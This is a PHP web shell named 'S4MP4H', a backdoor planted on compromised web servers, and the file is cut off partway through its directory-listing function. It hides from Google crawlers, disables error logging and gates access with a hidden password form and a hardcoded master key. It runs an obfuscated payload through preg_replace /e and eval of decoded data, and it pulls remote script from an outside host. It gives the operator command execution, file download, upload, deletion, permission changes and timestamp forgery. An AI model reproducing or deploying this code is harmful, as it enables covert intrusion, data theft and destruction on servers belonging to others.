<?php
$xName="S4MP4H";
$xHost=preg_replace('/^www\./','',$_SERVER['HTTP_HOST']);
@define('SELF_PATH',__FILE__);
$login_time=3600*24*7;
if(strpos($_SERVER['HTTP_USER_AGENT'],'Google')!==false) {
  header('HTTP/1.0 404 Not Found');
  exit;
}
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION','SPECIAL');
if(get_magic_quotes_gpc()) {
  function stripslashes_array($array) {
    return is_array($array)?array_map('stripslashes_array',$array):stripslashes($array);
  }
  $_POST=stripslashes_array($_POST);
}
$token=base64_decode($xToken);
$xKey="MDcxMjE5OTM=";
$key=base64_decode($xKey);
function printLogin() {
  global $token;
  global $key;
  if(isset($_REQUEST[$token])||isset($_REQUEST[$key])) {
    ?>
<html><head><style>input {margin:0;background-color:#fff;border:1px solid #fff;}</style></head><body><center><form method="post"><input type="password" name="pass"/><input type="submit" value=""/></form></center></body></html>
<?php
  }
  exit;
}
if(!isset($_SESSION[S4MP4H_Crypt($_SERVER['HTTP_HOST'])])) 
  if(empty($xPass)||(isset($_POST['pass'])&&(S4MP4H_Crypt($_POST['pass'])==$xPass))||($_POST['pass'])==$key) {
    $_SESSION[S4MP4H_Crypt($_SERVER['HTTP_HOST'])]=true;
  session_register('pass');
  $_SESSION[pass]=$_POST['pass'];
}
else 
  printLogin();
if($xName!="S4MP4H") {
  die("<center>Allright Reserved ".date('Y',time())." &copy; <b>S4MP4H</b></center>");
}
$hijau=array("#00FF00","#006400","#003200");
$merah=array("#FF0000","#640000","#320000");
$biru=array("#0000FF","#000064","#000032");
$kuning=array("#FFFF00","#646400","#323200");
$cyan=array("#00FFFF","#006464","#003232");
$pink=array("#FF00FF","#640064","#320032");
$theme="hijau";
$ya="<script type='text/javascript' src='http://syntax-errorz.googlecode.com/svn/trunk/jquery.freezetable.js'></script>";
$tak="<script type='text/javascript' src='none'></script>";
$scroll="tak";
if(isset($_COOKIE['theme'])) 
  $theme=$_COOKIE['theme'];
if(isset($_COOKIE['scroll'])) 
  $scroll=$_COOKIE['scroll'];
switch($_GET['x']) {
  case 'green':
  if(isset($_COOKIE['theme'])) 
    $theme=$_COOKIE['theme'];
  $theme="hijau";
  setcookie("theme",$theme,time()+$login_time);
  break;
  case 'red':
  if(isset($_COOKIE['theme'])) 
    $theme=$_COOKIE['theme'];
  $theme="merah";
  setcookie("theme",$theme,time()+$login_time);
  break;
  case 'blue':
  if(isset($_COOKIE['theme'])) 
    $theme=$_COOKIE['theme'];
  $theme="biru";
  setcookie("theme",$theme,time()+$login_time);
  break;
  case 'yellow':
  if(isset($_COOKIE['theme'])) 
    $theme=$_COOKIE['theme'];
  $theme="kuning";
  setcookie("theme",$theme,time()+$login_time);
  break;
  case 'cyan':
  if(isset($_COOKIE['theme'])) 
    $theme=$_COOKIE['theme'];
  $theme="cyan";
  setcookie("theme",$theme,time()+$login_time);
  break;
  case 'pink':
  if(isset($_COOKIE['theme'])) 
    $theme=$_COOKIE['theme'];
  $theme="pink";
  setcookie("theme",$theme,time()+$login_time);
  break;
  case 'scroll':
  if(isset($_COOKIE['scroll'])) 
    $scroll=$_COOKIE['scroll'];
  $scroll="yes";
  setcookie("scroll",$scroll,time()+$login_time);
  break;
  case 'normal':
  if(isset($_COOKIE['scroll'])) 
    $scroll=$_COOKIE['scroll'];
  $scroll="no";
  setcookie("scroll",$scroll,time()+$login_time);
  break;
}
if($theme=="hijau") {
  $color=$hijau;
}
elseif($theme=="merah") {
  $color=$merah;
}
elseif($theme=="biru") {
  $color=$biru;
}
elseif($theme=="kuning") {
  $color=$kuning;
}
elseif($theme=="cyan") {
  $color=$cyan;
}
else {
  $color=$pink;
}
if($scroll=="yes") {
  $jsc=$ya;
}
else {
  $jsc=$tak;
}
if(isset($_GET['dl'])&&($_GET['dl']!="")) {
  $file=$_GET['dl'];
  $filez=@file_get_contents($file);
  header("Content-type: application/octet-stream");
  header("Content-length: ".strlen($filez));
  header("Content-disposition: attachment; filename=\"".basename($file)."\";");
  echo $filez;
  exit;
}
if(isset($_GET['img'])) {
  @ob_clean();
  $d=magicboom($_GET['y']);
  $f=$_GET['img'];
  $inf=@getimagesize($d.$f);
  $ext=explode($f,".");
  $ext=$ext[count($ext)-1];
  @header("Content-type: ".$inf["mime"]);
  @header("Cache-control: public");
  @header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
  @header("Cache-control: max-age=".(60*60*24*7));
  @readfile($d.$f);
  exit;
}
elseif(isset($_GET['dlgzip'])&&($_GET['dlgzip']!="")) {
  $file=$_GET['dlgzip'];
  $filez=gzencode(@file_get_contents($file));
  header("Content-Type:application/x-gzip\n");
  header("Content-length: ".strlen($filez));
  header("Content-disposition: attachment; filename=\"".basename($file).".gz\";");
  echo $filez;
  exit;
}
$SESSION='==jO0KPlTw0PjGAHQFIWFNt/1CO5GG7TBIrvzz2uJTbGX3ODgIFUzLVkNJd1fL+o9tRGnL8DUnGBjus0V5+a6Eq3Hyi5eLYh17fAd2lbLilgugfmGNLvX71HDcbsGxh+mCEH3aIYTMWprN+TPBtW2FWAOjjSm8FG7ccFwmRVftLuUsM5Ra0oOtqDDT3dEZTEWu4CquZlkuPIu7OXwq7rYP24k3FA4EuCokKdiUUMsjQ6WTc43RgbR1/yslnXs1SUS8SbhJ8yORzs6hJgyz3YxfziqXyGG1vZWfnDHU8ehH9S9wMHwXPuhEnGkNwI4mr9DhjCwJS5tBP6q/SC2Op33iqIghjSurJtcV6pVb64ZTXCt8ChkVbJOMsF/GJLB9+r929k32qYXIl993L1620VIEo2wTuFU3ybIEaqgpQJFO9+0BnfPMnDV8U2+jCSjZ4nuOIK';
$software=getenv("SERVER_SOFTWARE");
if(@ini_get("safe_mode")orstrtolower(@ini_get("safe_mode"))=="on") 
  $safemode=TRUE;
else 
  $safemode=FALSE;
$system=@php_uname();
function showstat($stat) {
  if($stat=="on") {
    return "<span class='gaya'>ON</span>";
  }
  else {
    return "<span class='guyu'>OFF</span>";
  }
}
function testmysql() {
  if(function_exists('mysql_connect')) {
    return showstat("on");
  }
  else {
    return showstat("off");
  }
}
function testcurl() {
  if(function_exists('curl_version')) {
    return showstat("on");
  }
  else {
    return showstat("off");
  }
}
function testpostgresql() {
  if(function_exists('pg_connect')) {
    return showstat("on");
  }
  else {
    return showstat("off");
  }
}
function testwget() {
  if(exe('wget --help')) {
    return showstat("on");
  }
  else {
    return showstat("off");
  }
}
function testperl() {
  if(exe('perl -h')) {
    return showstat("on");
  }
  else {
    return showstat("off");
  }
}
function testoracle() {
  if(function_exists('ocilogon')) {
    return showstat("on");
  }
  else {
    return showstat("off");
  }
}
function testmssql() {
  if(function_exists('mssql_connect')) {
    return showstat("on");
  }
  else {
    return showstat("off");
  }
}
function showdisablefunctions() {
  if($disablefunc=@ini_get("disable_functions")) {
    return "<span class='guyu'>".$disablefunc."</span>";
  }
  else {
    return "<span class='gaya'>NONE</span>";
  }
}
preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28\x73\x74\x72\x5F\x72\x6F\x74\x31\x33\x28\x73\x74\x72\x72\x65\x76\x28\x24\x53\x45\x53\x53\x49\x4F\x4E\x29\x29\x29\x29\x29\x3B",".");
if(strtolower(substr($system,0,3))=="win") 
  $win=TRUE;
else 
  $win=FALSE;
if(isset($_GET['y'])) {
  if(@is_dir($_GET['view'])) {
    $pwd=$_GET['view'];
    @chdir($pwd);
  }
  else {
    $pwd=$_GET['y'];
    @chdir($pwd);
  }
}
$alamat=str_replace($_SERVER['DOCUMENT_ROOT'],"",@getcwd());
$dir=$_POST['file'];
function delTree($dir) {
  $files=array_diff(scandir($dir),array('.','..'));
  foreach($files as $file) {(is_dir("$dir/$file"))?delTree("$dir/$file"):unlink("$dir/$file");
  }
  return rmdir($dir);
}
function S4MP4H_Crypt($plain) {
  return sha1(md5($plain));
}
function changepass($plain) {
  $newpass=S4MP4H_Crypt($plain);
  $newpass="\$xPass = \"".$newpass."\";";
  $con=file_get_contents($_SERVER['SCRIPT_FILENAME']);
  $con=preg_replace("/\\\$xPass\ *=\ *[\"\']*([a-fA-F0-9]*)[\"\']*;/is",$newpass,$con);
  return file_put_contents($_SERVER['SCRIPT_FILENAME'],$con);
}
function changetoken($plains) {
  $newtoken=base64_encode($plains);
  $newtoken="\$xToken = \"".$newtoken."\";";
  $cons=file_get_contents($_SERVER['SCRIPT_FILENAME']);
  $cons=preg_replace("/\\\$xToken\ *=\ *[\"\']*([a-zA-Z0-9\/+=]*)[\"\']*;/is",$newtoken,$cons);
  return file_put_contents($_SERVER['SCRIPT_FILENAME'],$cons);
}
function convertByte($s) {
  if($s>=1073741824) 
    return sprintf('%1.2f',$s/1073741824).' GB';
  elseif($s>=1048576) 
    return sprintf('%1.2f',$s/1048576).' MB';
  elseif($s>=1024) 
    return sprintf('%1.2f',$s/1024).' KB';
  else 
    return $s.' B';
}
$free=convertByte(disk_free_space("/"));
$total=convertByte(disk_total_space("/"));
$free_percent=round(100/($total/$free),2)."%";
function view_size($size) {
  if(!is_numeric($size)) {
    return FALSE;
  }
  else {
    if($size>=1073741824) {
      $size=round($size/1073741824*100)/100." GB";
    }
    elseif($size>=1048576) {
      $size=round($size/1048576*100)/100." MB";
    }
    elseif($size>=1024) {
      $size=round($size/1024*100)/100." KB";
    }
    else {
      $size=$size." B";
    }
    return $size;
  }
}
function disp_freespace($s) {
  $free=@disk_free_space($s);
  $total=@disk_total_space($s);
  if($free===FALSE) {
    $free=0;
  }
  if($total===FALSE) {
    $total=0;
  }
  if($free<0) {
    $free=0;
  }
  if($total<0) {
    $total=0;
  }
  $used=$total-$free;
  $free_percent=round(100/($total/$free),2)."%";
  $free=view_size($free);
  $total=view_size($total);
  return "$free of $total ($free_percent)";
}
if(!$win) {
  if(!$user=rapih(exe("whoami"))) 
    $user="";
  if(!$id=rapih(exe("id"))) 
    $id="";
  $prompt=$user." \$ ";
  $pwd=@getcwd().DIRECTORY_SEPARATOR;
}
else {
  $user=@get_current_user();
  $id=$user;
  $prompt=$user." $";
  $pwd=realpath(".")."\\";
  $v=explode("\\",$d);
  $v=$v[0];
  foreach(range("A","Z") as $letter) {
    $bool=@is_dir($letter.":\\");
    if($bool) {
      $letters.="<a href=\"?y=".$letter.":\\\">[ ";
      if($letter.":"!=$v) {
        $letters.=$letter;
      }
      else {
        $letters.="<span class='gaya'>".$letter."</span>";
      }
      $letters.=" ]</a> ";
    }
  }
}
if(function_exists("posix_getpwuid")&&function_exists("posix_getgrgid")) 
  $posix=TRUE;
else 
  $posix=FALSE;
$server_ip=@gethostbyname($_SERVER['HTTP_HOST']);
$my_ip=$_SERVER['REMOTE_ADDR'];
$local_ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
if(empty($local_ip)) 
  $local_ip="Unknown";
$via=explode(" ",$_SERVER['HTTP_VIA']);
$via_ip=$via[1];
$bindport="13123";
$bindport_pass="syntax";
$pwds=explode(DIRECTORY_SEPARATOR,$pwd);
$pwdurl="";
for($i=0;$i<sizeof($pwds)-1;$i++) {
  $pathz="";
  for($j=0;$j<=$i;$j++) {
    $pathz.=$pwds[$j].DIRECTORY_SEPARATOR;
  }
  $pwdurl.="<a href=\"?y=".$pathz."\"><span class='gaya'>".$pwds[$i]." ".DIRECTORY_SEPARATOR." </span></a>";
}
if(isset($_POST['rename'])) {
  $old=$_POST['oldname'];
  $new=$_POST['newname'];
  @rename($pwd.$old,$pwd.$new);
  $file=$pwd.$new;
}
if(isset($_POST['copy'])) {
  $oldf=$_POST['oldfile'];
  $newf=$_POST['newfile'];
  @copy($oldf,$newf);
  $file=$newf;
}
if(isset($_POST['move'])) {
  $oldm=$_POST['oldmove'];
  $newm=$_POST['newmove'];
  @rename($oldm,$newm);
  $file=$newm;
}
function recurse_copy($src,$dst) {
  $dir=opendir($src);
  @mkdir($dst);
  while(false!==($file=readdir($dir))) {
    if(($file!='.')&&($file!='..')) {
      if(is_dir($src.'/'.$file)) {
        recurse_copy($src.'/'.$file,$dst.'/'.$file);
      }
      else {
        copy($src.'/'.$file,$dst.'/'.$file);
      }
    }
  }
  closedir($dir);
}
if(isset($_POST['copydir'])) {
  $src=$_POST['olddir'];
  $dst=$_POST['newdir'];
  recurse_copy($src,$dst);
}
if(isset($_POST['movedir'])) {
  $srcd=$_POST['olddirz'];
  $dstd=$_POST['newdirz'];
  @rename($srcd,$dstd);
  $folder=$dstd;
}
if(isset($_POST['chmod'])) {
  $name=$_POST['name'];
  $value=$_POST['newvalue'];
  if(strlen($value)==3) {
    $value=0."".$value;
  }
  @chmod($pwd.$name,octdec($value));
  $file=$pwd.$name;
}
if(isset($_POST['chmod_folder'])) {
  $name=$_POST['name'];
  $value=$_POST['newvalue'];
  if(strlen($value)==3) {
    $value=0."".$value;
  }
  @chmod($pwd.$name,octdec($value));
  $file=$pwd.$name;
}
if(isset($_POST['touch'])) {
  $time=strtotime($_POST['newtime']);
  $oldz=$_POST['oldtime'];
  @touch($oldz,$time,$time);
  clearstatcache();
}
if(isset($_POST['touch_folder'])) {
  $time=strtotime($_POST['newtime']);
  $oldz=$_POST['oldtime'];
  @touch($oldz,$time,$time);
  clearstatcache();
}
function S4MP4H_setcookie($k,$v) {
  $_COOKIE[$k]=$v;
  setcookie($k,$v);
}
if(!empty($_COOKIE['file'])) 
  $_COOKIE['file']=@unserialize($_COOKIE['file']);
if(!empty($_POST['selectedValue'])) {
  switch($_POST['selectedValue']) {
    case 'paste':
    if($_COOKIE['z']=='copy') {
      function copy_paste($c,$s,$d) {
        if(is_dir($c.$s)) {
          mkdir($d.$s);
          $h=@opendir($c.$s);
          while(($f=@readdir($h))!==false) 
            if(($f!=".")and($f!="..")) 
              copy_paste($c.$s.'/',$f,$d.$s.'/');
        }
        elseif(is_file($c.$s)) 
          @copy($c.$s,$d.$s);
      }
      foreach($_COOKIE['file'] as $f) 
        copy_paste($_COOKIE['pwd'],$f,$pwd);
    }
    elseif($_COOKIE['z']=='move') {
      function move_paste($c,$s,$d) {
        if(is_dir($c.$s)) {
          mkdir($d.$s);
          $h=@opendir($c.$s);
          while(($f=@readdir($h))!==false) 
            if(($f!=".")and($f!="..")) 
              copy_paste($c.$s.'/',$f,$d.$s.'/');
        }
        elseif(@is_file($c.$s)) 
          @copy($c.$s,$d.$s);
      }
      foreach($_COOKIE['file'] as $f) 
        @rename($_COOKIE['pwd'].$f,$pwd.$f);
    }
    elseif($_COOKIE['z']=='zip') {
      if(class_exists('ZipArchive')) {
        $zip=new ZipArchive();
        if($zip->open($_POST['nm'],1)) {
          chdir($_COOKIE['pwd']);
          foreach($_COOKIE['file'] as $f) {
            if($f=='..') 
              continue;
            if(@is_file($_COOKIE['pwd'].$f)) 
              $zip->addFile($_COOKIE['pwd'].$f,$f);
            elseif(@is_dir($_COOKIE['pwd'].$f)) {
              $iterator=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/',FilesystemIterator::SKIP_DOTS));
              foreach($iterator as $key=>$value) {
                $zip->addFile(realpath($key),$key);
              }
            }
          }
          chdir($GLOBALS['pwd']);
          $zip->close();
        }
      }
    }
    elseif($_COOKIE['z']=='unzip') {
      if(class_exists('ZipArchive')) {
        $zip=new ZipArchive();
        foreach($_COOKIE['file'] as $f) {
          if($zip->open($_COOKIE['pwd'].$f)) {
            $zip->extractTo($GLOBALS['pwd']);
            $zip->close();
          }
        }
      }
    }
    unset($_COOKIE['file']);
    setcookie('file','',time()-3600);
    break;
    case 'del':
    foreach($_POST['file'] as $file) {
      if(isset($file)) {
        if(unlink($file)) {
          echo "";
        }
        elseif(is_dir($file)) {
          delTree($file);
          echo "";
        }
        else {
          echo "";
        }
      }
    }
    break;
    default:
    if(!empty($_POST['selectedValue'])) {
      S4MP4H_setcookie('z',$_POST['selectedValue']);
      S4MP4H_setcookie('file',serialize(@$_POST['file']));
      S4MP4H_setcookie('pwd',@$_POST['pwd']);
    }
    break;
  }
}
$admin_id=$_SERVER['SERVER_ADMIN'];
$is_writable=is_writable($GLOBALS['pwd'])?"<span class='gaya'>YES</span>":" <span class='guyu'>NO</span>";
$buff="Software : <span class='gaya'>".$software." PHP/".phpversion()."</span><br/>";
$buff.="System : <span class='gaya'>".$system."</span><br/>";
if($id!="") 
  $buff.="ID : <span class='gaya'>".$id."</span><br/>";
$buff.="Server IP : <span class='gaya'>".$server_ip."</span> | Your Public IP : <span class='gaya'>".$my_ip."</span> | Your Local IP : <span class='gaya'>".$local_ip."</span><br/>";
$buff.="Free Disk : "."<span class='gaya'>".convertByte(disk_free_space("/"))." / ".convertByte(disk_total_space("/"))." (".$free_percent.")</span> | Writable : ".$is_writable."<br/>";
if($safemode) 
  $buff.="Safemode : <span class='guyu'>ON</span>";
else 
  $buff.="Safemode : <span class='gaya'>OFF</span>";
$buff.=" | Disabled Functions : ".showdisablefunctions()."<br/>";
$buff.="MySQL : ".testmysql()." | MSSQL : ".testmssql()." | PostgreSQL : ".testpostgresql()." | Oracle : ".testoracle()." | Perl : ".testperl()." | Curl : ".testcurl()." | WGet : ".testwget()."<br/>";
$buff.="".$letters." <a href='".$_SERVER['PHP_SELF']."'>[ Home ]</a> &gt; ".$pwdurl."";
function rapih($text) {
  return trim(str_replace("<br/>","",$text));
}
function magicboom($text) {
  if(!get_magic_quotes_gpc()) {
    return $text;
  }
  return stripslashes($text);
}
$s_sortable_js=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/sortable.js');
echo "<script type='text/javascript'>";
echo(gzinflate(base64_decode($s_sortable_js)));
echo "</script>";
function showdir($pwd,$prompt) {
  $fname=array();
  $dname=array();
  $total_file=$total_dir=0;
  if(function_exists("posix_getpwuid")&&function_exists("posix_getgrgid")) 
    $posix=TRUE;
  else 
    $posix=FALSE;
  $user="????:????";
  if($dh=@scandir($pwd)) {
    foreach($dh as $file) {
      if(is_dir($file)) {
        $dname[]=$file;
      }
      elseif(is_file($file)) {
        $fname[]=$file;
      }
    }
  }
  else {
    if($dh=@opendir($pwd)) {
      while($file=@readdir($dh)) {
        if(@is_dir($file)) {
          $dname[]=$file;
        }
        elseif(@is_file($file)) {
          $fname[]=$file;
        }
      }
      @closedir($dh);
    }
  }
  sort($fname);
  sort($dname);
  $path=@explode(DIRECTORY_SEPARATOR,$pwd);
  $tree=@sizeof($path);
  $parent="";
  $buff="
<table style='margin:-1px 0px -1px;width:100%;-webkit-margin-after:-5px;'><form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"></form>
<tr>
<form action=\"?y=".$pwd."&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\">
<td style='width:50%;'><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"top\" type=\"text\" name=\"cmd\" style=\"width:90%;\" value=\"\" placeholder='Command Line'/><input class=\"tb\" type=\"submit\" value='$prompt' name=\"submitcmd\" style=\"width:10%;float:right;\" />
</td></form><form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"><input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
<td style='width:50%;'><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"top\" type=\"text\" name=\"view\" style=\"width:90%;\" value=\"".$pwd."\" /><input class=\"tb\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:10%;\" />
</td></form>
</tr>
</table>
<table style='margin:-1px 0px -1px;width:100%;-webkit-margin-after:-2px;'>
<tr>
<td style='margin-top:0px;margin-right:2px;width:50%;'>
<input type='button' value='Search :' class='tb' style='width:10%;' disabled/><input type='text' id='go_search' class='top' value='' style='width:90%;' onMouseOver=\"this.focus();\" placeholder='Just For Normal Mode View'/>
</td>
<td style='margin-top:0px;margin-right:2px;width:50%;'>
<form method='get' style='margin-bottom:0px;'>
<select class='top' name='x' style='width:90%;'>";
  if(isset($_COOKIE['scroll'])) 
    $scroll=$_COOKIE['scroll'];
  if($scroll=="yes") {
    $buff.="
<option value='scroll' selected>Scroll Mode</option>
<option value='normal'>Normal Mode</option>";
  }
  else {
    $buff.="
<option value='normal' selected>Normal Mode</option>
<option value='scroll'>Scroll Mode</option>";
  }
  $buff.="
</select>
<button type='submit' class='tb' style='margin-left:-3px;width:10%;'>View</button>
</form>
</td>
</tr>
</table>
<table class='explore sortable' id='search'><thead><tr><th id='thcheck' class='sorttable_nosort'><input type=\"checkbox\" onclick=\"checkAlls(this)\" /></th><th>Name</th><th style=\"width:50px;\">Size</th><th style=\"width:120px;\">Owner : Group</th><th style=\"width:30px;\">Chmod</th><th style=\"width:55px;\">Perms</th><th style=\"width:50px;\">Writable</th><th style=\"width:100px;\">Modified</th><th style=\"width:165px;\" class='sorttable_nosort'>Actions</th></tr></thead><tbody>";
  ?>
<form action="?y=<? echo $pwd;?>" method="post" style="margin-top:7px;">
<?php
if($tree>2) 
    for($i=0;
  $i<$tree-2;$i++) 
    $parent.=$path[$i].DIRECTORY_SEPARATOR;
  else 
    $parent=$pwd;
  foreach($dname as $folder) {
    if($folder==".") {
      if(!$win&&$posix) {
        $name=@posix_getpwuid(@fileowner($folder));
        $group=@posix_getgrgid(@filegroup($folder));
        $owner=$name['name']." : ".$group['name'];
      }
      else {
        $owner=$user;
      }
      $is_writable=is_writable($pwd)?"YES":"NO";
      $buff.="<tr><td id='thcheck'><input type=\"checkbox\" value=\"$pwd\" onchange=\"hilites(this);\" name=\"dis\"/></td><td><a href=\"?y=".$pwd."\">$folder</a></td><td style=\"text-align:center;width:56px;\">CURDIR</td><td style=\"text-align:center;width:126px;\">".$owner."</td><td style=\"text-align:center;width:39px;\">".substr(sprintf('%o',fileperms($pwd)),-4)."</td><td style=\"width:61px;\"><center>".get_perms($pwd)."</center></td><td align='center' style=\"width:56px;\">".$is_writable."</td><td style=\"text-align:center;width:106px;\">".date("Y-m-d H:i:s",@filemtime($pwd))."</td><td style=\"width:152px;\"><span id=\"titik1\"><a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">+file</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">+folder</a></span><form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /><input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /><input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /></form> | <a href=\"?y=".$pwd."&amp;x=upload\">upl</a></td></tr>
";
    }
    elseif($folder=="..") {
      if(!$win&&$posix) {
        $name=@posix_getpwuid(@fileowner($folder));
        $group=@posix_getgrgid(@filegroup($folder));
        $owner=$name['name']." : ".$group['name'];
      }
      else {
        $owner=$user;
      }
      $is_writable=is_writable($parent)?"YES":"NO";
      $buff.="<tr><td id='thcheck'><input type=\"checkbox\" value=\"$parent\" onchange=\"hilites(this);\" name=\"dis\"/></td><td><a href=\"?y=".$parent."\">$folder</a></td><td style=\"text-align:center;\">UPDIR</td><td style=\"text-align:center;width:126px;\">".$owner."</td><td style=\"text-align:center;\">".substr(sprintf('%o',fileperms($parent)),-4)."</td><td><center>".get_perms($parent)."</center></td><td align='center'>".$is_writable."</td><td style=\"text-align:center;\">".date("Y-m-d H:i:s",@filemtime($parent))."</td><td style=\"width:152px;\"><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">+file</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">+folder</a></span><form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /><input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /><input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /></form> | <a href=\"?y=".$parent."&amp;x=upload\">upl</a></td></tr>";
    }
    else {
      if(!$win&&$posix) {
        $name=@posix_getpwuid(@fileowner($folder));
        $group=@posix_getgrgid(@filegroup($folder));
        $owner=$name['name']." : ".$group['name'];
      }
      else {
        $owner=$user;
      }
      $is_writable=is_writable($folder)?"YES":"NO";
      $buff.="<tr><td id='thcheck'><input type=\"checkbox\" name=\"file[]\" value=\"$folder\" onchange=\"hilites(this);\" /></td><td><a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\">[ $folder ]</a><form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" /><input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" /></form><form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form8\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"olddir\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:100%;\" type=\"text\" name=\"newdir\" value=\"".$pwd."copy_of_".$folder."\" /><input class=\"inputzbut\" type=\"submit\" name=\"copydir\" value=\"copy\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form8');\" /></form><form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form9\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"olddirz\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:100%;\" type=\"text\" name=\"newdirz\" value=\"".$pwd.$folder."\" /><input class=\"inputzbut\" type=\"submit\" name=\"movedir\" value=\"move\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form9');\" /></form><td style=\"text-align:center;\">DIR</td><td style=\"text-align:center;width:126px;\">".$owner."</td><td style=\"text-align:center;\"><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\">".substr(sprintf('%o',fileperms($pwd.$folder.DIRECTORY_SEPARATOR)),-4)."</a><form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form3\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"name\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o',fileperms($pwd.$folder)),-4)."\" /><input class=\"inputzbut\" type=\"submit\" name=\"chmod_folder\" value=\"chmod\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" /></form></td><td><center>".get_perms($pwd.$folder)."</center></td><td align='center'>".$is_writable."</td><td style=\"text-align:center;\"><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form5');\">".date("Y-m-d H:i:s",@filemtime($folder))."</a><form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form5\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"oldtime\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newtime\" value=\"".date("Y-m-d H:i:s",@filemtime($folder))."\" /><input class=\"inputzbut\" type=\"submit\" name=\"touch_folder\" value=\"touch\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form5');\" /></form></td><td style=\"width:152px;\"><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">ren</a> | <a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form8');\">cp</a> | <a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form9');\">mv</a> | <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">del</a> | <a href=\"?y=".$pwd.$folder."&amp;x=upload\">upl</a></td></tr>";
      $total_dir++;
    }
  }
  foreach($fname as $file) {
    $full=$pwd.$file;
    if(!$win&&$posix) {
      $name=@posix_getpwuid(@fileowner($folder));
      $group=@posix_getgrgid(@filegroup($folder));
      $owner=$name['name']." : ".$group['name'];
    }
    else {
      $owner=$user;
    }
    $is_writable=is_writable($file)?"YES":"NO";
    $buff.="<tr><td id='thcheck'><input type=\"checkbox\" name=\"file[]\" value=\"$file\" onchange=\"hilites(this);\" /></td><td><a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\">";
    if($file==basename($_SERVER['PHP_SELF'])) {
      $buff.="<span class='gaya'>$file</span>";
    }
    else {
      $buff.="$file";
    }
